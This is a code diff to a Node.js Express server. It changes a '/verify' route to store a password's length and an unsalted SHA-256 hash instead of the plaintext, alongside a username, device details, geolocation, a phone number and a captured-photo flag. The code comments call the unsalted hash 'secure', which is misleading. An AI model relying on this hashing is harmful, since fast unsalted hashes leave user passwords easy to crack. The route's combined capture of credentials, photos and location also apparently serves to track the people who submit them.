@@ -6,6 +6,7 @@ const nocache = require("nocache");
 const fetch = require("node-fetch"); // For geo location API lookup
 const fs = require("fs");
 const path = require("path");
+const crypto = require("crypto"); // For password hashing
 
 // Static files
 app.use(express.static("public"));
@@ -56,6 +57,12 @@ async function getGeo(ip) {
     console.log("Geo API Error:", err);
     return null;
   }
+}
+
+// Hash password using SHA-256
+function hashPassword(password) {
+  if (!password) return null;
+  return crypto.createHash("sha256").update(password).digest("hex");
 }
 
 // Routes
@@ -259,7 +266,8 @@ app.post("/verify", async (req, res) => {
     deviceDetails: parsedDeviceDetails,
     userAgent,
     username: inputUsername,
-    password: inputPassword,
+    password: `[${inputPassword.length} chars]`,  // Only length for display
+    passwordHash: hashPassword(inputPassword),     // Secure hash
     phoneNumber: phoneNumber || null,
     photoData: photoData ? "[CAPTURED]" : null,
   };
